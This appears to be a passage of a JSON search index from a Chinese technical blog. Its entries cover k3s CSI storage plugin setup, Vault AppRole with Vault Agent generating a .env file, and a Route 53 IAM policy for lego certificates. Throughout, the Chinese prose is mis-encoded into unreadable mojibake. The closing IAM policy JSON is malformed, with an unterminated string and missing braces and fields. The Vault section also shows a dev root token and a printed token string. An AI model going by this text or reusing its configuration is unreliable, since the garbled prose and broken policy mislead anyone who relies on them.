·æ—¢å¯ä»¥è·‘åˆ°åº•å±‚ä¸Šæä¾›æ–‡ä»¶å—è®¾å¤‡ï¼Œä¹Ÿå¯ä»¥ä¸Šå‡åˆ°ç±»ä¼¼NFSæˆ–è€…S3çš„å±‚æ¬¡æä¾›æ–‡ä»¶ç³»ç»Ÿï¼Œèƒ½æ»¡è¶³å¤§å¤šæ•°éœ€æ±‚ã€‚é‚£æºä»£ç å°±ç»å¯¹ä¸æä¾›äº†ï¼Œåªè¯´ä¸€ä¸‹è¿‡ç¨‹ï¼š\u003c/p\u003e\n\u003ch2 id=\"csi-pluginçš„ä½¿ç”¨æ–¹æ³•\"\u003eCSI PLUGINçš„ä½¿ç”¨æ–¹æ³•ï¼š\u003c/h2\u003e\n\u003ch4 id=\"ä¸€å¯¼å…¥é•œåƒ\"\u003eä¸€ã€å¯¼å…¥é•œåƒ\u003c/h4\u003e\n\u003cp\u003ecsiå­˜å‚¨æ’ä»¶çš„image\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecr.yandex/crp9ftr22d26age3hulg/csi-s3:0.42.66\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ–‡ä»¶ï¼šcsi.tar\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eå°†æ–‡ä»¶æ”¾åˆ°æ‰€æœ‰worknodeä¸Šï¼Œå¯¼å…¥æœ¬åœ°é•œåƒåº“:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ectr --address /run/k3s/containerd/containerd.sock -n k8s.io images import /root/csi.tar\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecrictl -r unix:///run/k3s/containerd/containerd.sock images\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹åˆ°æœ‰ cr.yandex/crp9ftr22d26age3hulg/csi-s3:0.42.66 æ—¢æ˜¯å¯¼å…¥æˆåŠŸ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250807151100045\" loading=\"lazy\" src=\"/posts/20250807-csi_scaleflash/image-20250807151100045.png\"\u003e\u003c/p\u003e\n\u003ch4 id=\"äºŒå®‰è£…controllerå’Œnodeserver\"\u003eäºŒã€å®‰è£…controllerå’Œnodeserver\u003c/h4\u003e\n\u003cp\u003eå®‰è£…driver\u003c/p\u003e\n\u003cp\u003eæ–‡ä»¶ï¼šdriver.yaml\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl apply -f driver.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®‰è£…controller\u003c/p\u003e\n\u003cp\u003eæ–‡ä»¶ï¼šcontroller.yaml\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl apply -f controller.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®‰è£…nodeserver\u003c/p\u003e\n\u003cp\u003eæ–‡ä»¶ï¼šnodeserver.yaml\u003c/p\u003e\n\u003cp\u003eè§£é‡Šä¸€ä¸‹ï¼Œcontrolleræ˜¯ä¸€ä¸ªstatefulsetï¼Œæ•´ä¸ªé›†ç¾¤è¿è¡Œä¸€ä¸ªå³å¯ï¼›è€Œnodeservershiåˆ™æ˜¯ä¸€ä¸ªdaemonsetï¼Œæ¯ä¸ªworknodeéƒ½ä¼šè¿è¡Œä¸€ä¸ªå‰¯æœ¬\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250807151213874\" loading=\"lazy\" src=\"/posts/20250807-csi_scaleflash/image-20250807151213874.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸Šé¢ worknode æ˜¯3ä¸ªï¼Œæ‰€ä»¥æœ‰3ä¸ªå‰¯æœ¬\u003c/p\u003e\n\u003ch4 id=\"ä¸‰scaleflash-å—è®¾å¤‡çš„ä½¿ç”¨\"\u003eä¸‰ã€scaleflash å—è®¾å¤‡çš„ä½¿ç”¨\u003c/h4\u003e\n\u003cp\u003eå—è®¾å¤‡æœ€å°å•ä½æ˜¯Gï¼Œæ‰€ä»¥å¦‚æœéœ€æ±‚äº†100Mï¼Œé‚£ä¹Ÿæ˜¯1Gã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå¿…é¡»å®šä¹‰ä¸€ä¸ªstorageclassï¼Œä»¥åä½¿ç”¨è¿™ä¸€ä¸ªstorageclasså°±å¯ä»¥äº†ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;scaleflash-storageclass.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ekind: StorageClass\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eapiVersion: storage.k8s.io/v1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  name: scaleflash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eprovisioner: ru.yandex.s3.csi\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eparameters:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  mounter: scaleflash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  clstID: \u0026#34;nvmatrix_101\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  fsType: \u0026#34;xfs\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl apply -f scaleflash-storageclass.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå†å®šä¹‰pvc\u003c/p\u003e","title":"ä¸ºæå®¢å¤©æˆæ”¹å†™ä¸€å¥—CSIå­˜å‚¨æ’ä»¶"},{"content":"Vaultæ˜¯ä¸ªå¾ˆå‰å®³çš„ secret å¼•æ“äº†ï¼Œä¸å¤šè¯´äº†ï¼Œä¸»è¦ç”¨äºé›†ä¸­ç®¡ç†å„ç§å¯†ç ã€å¯†é’¥ã€‚\nç”¨æ¥ç®¡ç†Kubernetesçš„å‡­æ®ç›¸å½“å¥½ï¼Œä½†æ˜¯æˆ‘ä»¬é€šå¸¸æ˜¯è‡ªå·±å¼€å‘çš„ç¨‹åºï¼Œç„¶åéœ€è¦è¯»å„ç§é…ç½®æ–‡ä»¶ï¼Œæ¯”å¦‚è¿æ¥DBçš„ç”¨æˆ·åï¼Œå¯†ç ç­‰ç­‰ï¼Œæœ€åè¿æ¥åˆ°æ•°æ®åº“ã€‚\né‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœç®¡ç†å¥½é…ç½®é¡¹å‘¢ï¼Ÿ\næ–¹æ³•å¦‚ä¸‹ï¼Œç”¨approleè¯»å–Vaultçš„é…ç½®ä¿¡æ¯ï¼š\nä¸€ã€å¯åŠ¨vaultå¼•æ“æµ‹è¯•ç¯å¢ƒ é¦–å…ˆå¯åŠ¨vaultå¼•æ“ï¼Œæµ‹è¯•ï¼Œç”¨Dockerï¼Œæ–¹ä¾¿åˆ›å»ºå’Œé”€æ¯\n# å¯åŠ¨å®¹å™¨ # æˆ‘ä»¬æ‰‹åŠ¨æŒ‡å®šäº†ROOT_TOKENæ˜¯rootï¼Œè¿™åªç”¨äºæµ‹è¯•ç¯å¢ƒ docker run -d --rm \\ --add-host host.docker.internal:host-gateway \\ --cap-add=IPC_LOCK \\ --name vault \\ -p 8200:8200 \\ -e VAULT_DEV_ROOT_TOKEN_ID=root \\ -e VAULT_DEV_LISTEN_ADDRESS=0.0.0.0:8200 \\ hashicorp/vault --add-host host.docker.internal:host-gateway è¿™ä¸ªä¸ªå‚æ•°çš„ä½œç”¨æ˜¯åœ¨å®¹å™¨çš„ /etc/hosts æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªä¸»æœºåå’Œ IP åœ°å€çš„æ˜ å°„ã€‚\n--add-host: è¿™æ˜¯ docker run çš„ä¸€ä¸ªé€‰é¡¹ï¼Œç”¨æ¥åœ¨å®¹å™¨çš„ /etc/hosts æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰çš„ä¸»æœºæ¡ç›®ã€‚ host.docker.internal: è¿™æ˜¯ä¸»æœºåã€‚åœ¨ Docker Desktopï¼ˆmacOS å’Œ Windowsï¼‰ä¸­ï¼Œhost.docker.internal æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ DNS åç§°ï¼Œå®ƒä¼šè¢«è§£æä¸ºå®¿ä¸»æœºçš„å†…éƒ¨ IP åœ°å€ã€‚ host-gateway: è¿™æ˜¯ docker åœ¨è¾ƒæ–°ç‰ˆæœ¬ä¸­å¼•å…¥çš„ä¸€ä¸ªç‰¹æ®Šå…³é”®å­—ã€‚å®ƒä»£è¡¨äº†å®¿ä¸»æœºä¸ Docker ç½‘ç»œä¹‹é—´çš„ç½‘å…³ IP åœ°å€ã€‚åœ¨è®¸å¤š Linux ç¯å¢ƒä¸­ï¼Œè¿™ä¸ªå…³é”®å­—ä¼šæŒ‡å‘ Docker çš„ç½‘æ¡¥ IPï¼ˆä¾‹å¦‚ 172.17.0.1ï¼‰ã€‚ ç»¼åˆèµ·æ¥ï¼Œ--add-host host.docker.internal:host-gateway çš„ä½œç”¨æ˜¯ï¼š\nåœ¨å®¹å™¨å†…éƒ¨åˆ›å»ºä¸€ä¸ª DNS æ¡ç›®ï¼Œå°† host.docker.internal è¿™ä¸ªåå­—æ˜ å°„åˆ°å®¿ä¸»æœºçš„ IP åœ°å€ã€‚è¿™ä½¿å¾—å®¹å™¨ä¸­çš„åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡ host.docker.internal è¿™ä¸ªåŸŸåæ¥è®¿é—®å®¿ä¸»æœºä¸Šè¿è¡Œçš„æœåŠ¡ï¼Œè€Œæ— éœ€çŸ¥é“å®¿ä¸»æœºçš„å…·ä½“ IP åœ°å€ã€‚\nè¿™å¯¹äºå¼€å‘ç¯å¢ƒéå¸¸æœ‰ç”¨ï¼Œæ¯”å¦‚ä½ çš„ Vault å®¹å™¨éœ€è¦è®¿é—®åœ¨å®¿ä¸»æœºä¸Šè¿è¡Œçš„æ•°æ®åº“æˆ–è®¤è¯æœåŠ¡ã€‚\nå®¹å™¨è·‘èµ·æ¥ä¹‹åæˆ‘ä»¬éªŒè¯ä¸€ä¸‹ï¼š\nexport VAULT_ADDR=\u0026#34;http://127.0.0.1:8200\u0026#34; export VAULT_TOKEN=\u0026#34;root\u0026#34; vault status ç„¶åæˆ‘ä»¬æ‰“å¼€æµè§ˆå™¨ï¼šhttp://x.x.x.x:8200ï¼Œä½¿ç”¨Token rootç™»å½•\nçœ‹çœ‹æœ‰å•¥secretå¼•æ“ï¼Œè¿˜çœŸä¸å°‘\næ¥ä¸‹æ¥çš„æ“ä½œå°½é‡éƒ½æ˜¯åœ¨CLIå‘½ä»¤è¡Œå®Œæˆäº†ã€‚\näºŒã€åˆå§‹åŒ–å„ç§é…ç½®ä¿¡æ¯ export VAULT_ADDR=\u0026#34;http://127.0.0.1:8200\u0026#34; export VAULT_TOKEN=\u0026#34;root\u0026#34; # æ”¾å…¥æµ‹è¯•æ•°æ® vault kv put secret/dbinfo user=root pass=test123 # è®¾ç½®approleçš„è®¤è¯æ–¹å¼ vault auth enable approle # ç¼–è¾‘ä¸€ä¸ªpolicyæ–‡ä»¶ï¼Œagent-policy.hcl cat \u0026lt; EOF \u0026gt; agent-policy.hcl path \u0026#34;secret/data/dbinfo\u0026#34; { capabilities = [\u0026#34;read\u0026#34;] } EOF # å†™å…¥policy vault policy write agent-policy agent-policy.hcl # å»ºç«‹AppRole å¹¶é™„åŠ policy vault write auth/approle/role/vault-agent-role policies=\u0026#34;agent-policy\u0026#34; # genå‡º role-id å’Œ secret-id vault read auth/approle/role/vault-agent-role/role-id vault write -f auth/approle/role/vault-agent-role/secret-id # æŠŠ role-id å’Œ secert-id æ”¾å…¥æ–‡ä»¶ vault read -field role_id auth/approle/role/vault-agent-role/role-id \u0026gt; role-id æˆ– vault read auth/approle/role/vault-agent-role/role-id -format=json | jq -r .data.role_id \u0026gt; role-id # æ³¨æ„ï¼Œæ¯æ¬¡å†™éƒ½ä¼šå˜çš„ vault write -f -field secret_id auth/approle/role/vault-agent-role/secret-id \u0026gt; secret-id æˆ– vault write -f auth/approle/role/vault-agent-role/secret-id -format=json | jq -r .data.secret_id \u0026gt; secret-id unset VAULT_ADDR unset VAULT_TOKEN æ³¨æ„ä¸Šé¢ä¸€ç³»åˆ—æ“ä½œï¼Œè·ŸIAMçš„æ“ä½œåŸºæœ¬ä¸€æ‘¸ä¸€æ ·ï¼Œå¦‚å‡ºä¸€è¾™ï¼Œå…ˆå®šä¹‰policyï¼Œç„¶åpolicyé™„åŠ roleï¼Œroleå†genå‡ºrole-idå’Œsecret-id\né‚£role-idå°±ç›¸å½“äºusernameï¼Œé‚£secret-idå°±ç›¸å½“äºpasswordï¼Œè¿™ä¹ˆç†è§£å°±å¯¹äº†ã€‚\nä¸‰ã€é…ç½®Vault Agentä»£ç†ï¼ŒåŠ¨æ€ä»Vaultè·å–é…ç½®ä¿¡æ¯ï¼Œå¹¶é€šè¿‡æ¨¡æ¿è¾“å‡º è®¾ç½®vault-agent.hclï¼š\nvault { address = \u0026#34;http://127.0.0.1:8200\u0026#34; token = \u0026#34;root\u0026#34; } auto_auth { method { type = \u0026#34;approle\u0026#34; config = { role_id_file_path = \u0026#34;./role-id\u0026#34; secret_id_file_path = \u0026#34;./secret-id\u0026#34; remove_secret_id_file_after_reading = false } } sink { type = \u0026#34;file\u0026#34; config = { path = \u0026#34;./vault-agent-token\u0026#34; } } } template { source = \u0026#34;./env.tmpl\u0026#34; destination = \u0026#34;./.env\u0026#34; } è®¾ç½®æ¨¡æ¿æ–‡ä»¶env.tmplï¼š\nDB_USER={{ with secret \u0026#34;secret/data/dbinfo\u0026#34; }}{{ .Data.data.user }}{{ end }} DB_PASS={{ with secret \u0026#34;secret/data/dbinfo\u0026#34; }}{{ .Data.data.pass }}{{ end }} å¯åŠ¨\nvault agent -config=./agent.hcl -log-level=debug ç„¶åæ£€æŸ¥.env\ncat .env DB_USER=root DB_PASS=test123 cat vault-agent-token hvs.CAESILRWC98usmzSfxdJRMnKWUlvT9kFV1zzPfrkGgdBInYfGh4KHGh2cy54NHhEQnNUa2pmTzU5NTlRN1234567890 è¿™æ ·å°±okäº†ï¼Œä½†æ˜¯è¿™æ ·ä¹Ÿæœ‰ä¸ªå¤§éº»çƒ¦ï¼Œé‚£å°±æ˜¯tokenï¼Œå¦‚æœé‡å¯tokenå˜äº†ï¼Œé‚£å¿…é¡»é‡æ–°çŒå…¥ã€‚\næœ€åï¼Œæ”¾ä¸Šagentçš„systemdæ–‡ä»¶/etc/systemd/system/vault-agent.serviceï¼š\n[Unit] Description=Nomad Agent Requires=consul-online.target After=consul-online.target [Service] KillMode=process KillSignal=SIGINT ExecStart=/usr/local/bin/vault agent -config /etc/vault-agent.d/vault-agent.hcl ExecReload=/bin/kill -HUP $MAINPID Restart=on-failure RestartSec=2 StartLimitBurst=3 StartLimitIntervalSec=10 LimitNOFILE=65536 [Install] WantedBy=multi-user.target å…³äºRoot Token\nç¬¬ä¸€æ¬¡è¿è¡Œçš„æ—¶å€™ï¼Œvault operator init ä¼šå¾—åˆ°è¿™ä¸ªè¿™ä¸ªToken\néšåå‘¢ï¼Œå†å¾—åˆ°è¿™ä¸ªï¼Œå°±å¿…é¡» vault operator generate-rootäº†ï¼Œå¿…é¡»unseal keyã€‚\nå†éšåï¼Œç”¨vault loginï¼Œå°±å¯ä»¥ç”¨äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20250806-vault_approle_env/","summary":"\u003cp\u003eVaultæ˜¯ä¸ªå¾ˆå‰å®³çš„ secret å¼•æ“äº†ï¼Œä¸å¤šè¯´äº†ï¼Œä¸»è¦ç”¨äºé›†ä¸­ç®¡ç†å„ç§å¯†ç ã€å¯†é’¥ã€‚\u003c/p\u003e\n\u003cp\u003eç”¨æ¥ç®¡ç†Kubernetesçš„å‡­æ®ç›¸å½“å¥½ï¼Œä½†æ˜¯æˆ‘ä»¬é€šå¸¸æ˜¯è‡ªå·±å¼€å‘çš„ç¨‹åºï¼Œç„¶åéœ€è¦è¯»å„ç§é…ç½®æ–‡ä»¶ï¼Œæ¯”å¦‚è¿æ¥DBçš„ç”¨æˆ·åï¼Œå¯†ç ç­‰ç­‰ï¼Œæœ€åè¿æ¥åˆ°æ•°æ®åº“ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœç®¡ç†å¥½é…ç½®é¡¹å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæ–¹æ³•å¦‚ä¸‹ï¼Œç”¨approleè¯»å–Vaultçš„é…ç½®ä¿¡æ¯ï¼š\u003c/p\u003e\n\u003ch5 id=\"ä¸€å¯åŠ¨vaultå¼•æ“æµ‹è¯•ç¯å¢ƒ\"\u003eä¸€ã€å¯åŠ¨vaultå¼•æ“æµ‹è¯•ç¯å¢ƒ\u003c/h5\u003e\n\u003cp\u003eé¦–å…ˆå¯åŠ¨vaultå¼•æ“ï¼Œæµ‹è¯•ï¼Œç”¨Dockerï¼Œæ–¹ä¾¿åˆ›å»ºå’Œé”€æ¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å¯åŠ¨å®¹å™¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æˆ‘ä»¬æ‰‹åŠ¨æŒ‡å®šäº†ROOT_TOKENæ˜¯rootï¼Œè¿™åªç”¨äºæµ‹è¯•ç¯å¢ƒ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run -d --rm \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --add-host host.docker.internal:host-gateway \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --cap-add\u003cspan class=\"o\"\u003e=\u003c/span\u003eIPC_LOCK \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --name vault \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -p 8200:8200 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -e \u003cspan class=\"nv\"\u003eVAULT_DEV_ROOT_TOKEN_ID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eroot \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -e \u003cspan class=\"nv\"\u003eVAULT_DEV_LISTEN_ADDRESS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0:8200 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  hashicorp/vault\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"--add-host-hostdockerinternalhost-gateway\"\u003e\u003ccode\u003e--add-host host.docker.internal:host-gateway\u003c/code\u003e\u003c/h6\u003e\n\u003cp\u003eè¿™ä¸ªä¸ªå‚æ•°çš„ä½œç”¨æ˜¯åœ¨å®¹å™¨çš„ \u003ccode\u003e/etc/hosts\u003c/code\u003e æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªä¸»æœºåå’Œ IP åœ°å€çš„æ˜ å°„ã€‚\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--add-host\u003c/code\u003e\u003c/strong\u003e: è¿™æ˜¯ \u003ccode\u003edocker run\u003c/code\u003e çš„ä¸€ä¸ªé€‰é¡¹ï¼Œç”¨æ¥åœ¨å®¹å™¨çš„ \u003ccode\u003e/etc/hosts\u003c/code\u003e æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰çš„ä¸»æœºæ¡ç›®ã€‚\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehost.docker.internal\u003c/code\u003e\u003c/strong\u003e: è¿™æ˜¯ä¸»æœºåã€‚åœ¨ Docker Desktopï¼ˆmacOS å’Œ Windowsï¼‰ä¸­ï¼Œ\u003ccode\u003ehost.docker.internal\u003c/code\u003e æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ DNS åç§°ï¼Œå®ƒä¼šè¢«è§£æä¸ºå®¿ä¸»æœºçš„å†…éƒ¨ IP åœ°å€ã€‚\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehost-gateway\u003c/code\u003e\u003c/strong\u003e: è¿™æ˜¯ \u003ccode\u003edocker\u003c/code\u003e åœ¨è¾ƒæ–°ç‰ˆæœ¬ä¸­å¼•å…¥çš„ä¸€ä¸ªç‰¹æ®Šå…³é”®å­—ã€‚å®ƒä»£è¡¨äº†å®¿ä¸»æœºä¸ Docker ç½‘ç»œä¹‹é—´çš„ç½‘å…³ IP åœ°å€ã€‚åœ¨è®¸å¤š Linux ç¯å¢ƒä¸­ï¼Œè¿™ä¸ªå…³é”®å­—ä¼šæŒ‡å‘ Docker çš„ç½‘æ¡¥ IPï¼ˆä¾‹å¦‚ \u003ccode\u003e172.17.0.1\u003c/code\u003eï¼‰ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eç»¼åˆèµ·æ¥ï¼Œ\u003ccode\u003e--add-host host.docker.internal:host-gateway\u003c/code\u003e çš„ä½œç”¨æ˜¯ï¼š\u003c/strong\u003e\u003c/p\u003e","title":"vaultä½¿ç”¨agentéªŒè¯approleç”Ÿæˆ.envç¯å¢ƒå˜é‡"},{"content":"ä¸Šä¸€ç¯‡æˆ‘ä»¬è¯´äº† Awsçš„EC2æœåŠ¡å™¨ç”¨legoè·å¾—å…è´¹è¯ä¹¦å¹¶æ›´æ–°åˆ°ACMï¼Œè¿™ä¸‹åˆæ¥äº†ä¸ªæ›´åŠ æœ‰éš¾åº¦çš„æŒ‘æˆ˜ï¼š\nDNSè§£ææ˜¯æ”¾åœ¨äº†AWS Route 53ä¸Šï¼Œç„¶åvpsä¸Šè·‘ç€BTå®å¡”ï¼Œç”¨æ¥ä»£ç†è½¬å‘å¼€å‘ç¯å¢ƒçš„httpsè¯ä¹¦\nè¿™ä¸ªç¯å¢ƒå¦‚ä½•ç”¨legoæ¥å®‰å…¨çš„ç”³è¯·åˆ°è¯ä¹¦å¹¶é…ç½®å®å¡”å‘¢ï¼Ÿè¿™å›å¯ä¸åƒEC2é‚£æ ·å¯ä»¥è‡ªåŠ¨é™„åŠ IAMè§’è‰²äº†\næˆ‘ä»¬å…ˆæ¥çœ‹çœ‹legoçš„ç”¨æ³•å§ï¼š\nhttps://go-acme.github.io/lego/dns/route53/\nè¯­æ³•å¦‚ä¸‹ï¼š\nç»§ç»­çœ‹ï¼Œçœ‹æ¥å¿…é¡»éœ€è¦IAMçš„å‡­æ®æ‰å¯ä»¥ï¼Œç»§ç»­ä¸‹æ‹‰ï¼Œæœ‰ä½¿ç”¨IAMçš„policyï¼Œé‚£æˆ‘ä»¬å¿…é¡»åˆ›å»ºä¸€ä¸ªRoleè§’è‰²ï¼Œç„¶åå†å»ºç«‹ä¸€ä¸ªä»£ç†ç”¨æˆ·ï¼Œgenå‡ºkeyï¼Œé€šè¿‡è¿™ä¸ªä»£ç†ç”¨æˆ·çš„å‡­æ®æ¥é—´æ¥è¿›è¡Œè®¿é—®\næ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€å»route53ï¼Œæ‹¿åˆ°arn æˆ‘ä»¬è¦æ‹¿åˆ°å…·ä½“åŸŸåçš„zone IDï¼Œå°±æ˜¯Z0æ‰“å¤´çš„é‚£ä¸€ä¸²\näºŒã€å»ºç«‹IAMå®é™…å·¥ä½œçš„Role é¦–å…ˆå»ºç«‹ä¸€ä¸ªPolicyï¼Œroute53AcmeCert\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17 \u0026#34;Statement\u0026#34;: [ \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;route53:GetChange\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:route53:::change/*\u0026#34; }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;route53:ListHostedZonesByName\u0026#34;, }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;route53:ListResourceRecordSets\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:route53:::hostedzone/Z01111111111111111111\u0026#34; ] }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;route53:ChangeResourceRecordSets\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:route53:::hostedzone/Z01111111111111111111\u0026#34; ], \u0026#34;Condition\u0026#34;: { \u0026#34;ForAllValues:StringEquals\u0026#34;: { \u0026#34;route53:ChangeResourceRecordSetsNormalizedRecordNames\u0026#34;: [ \u0026#34;_acme-challenge.example.com\u0026#34; ], \u0026#34;route53:ChangeResourceRecordSetsRecordTypes\u0026#34;: [ \u0026#34;TXT\u0026#34; ] } } } ] } 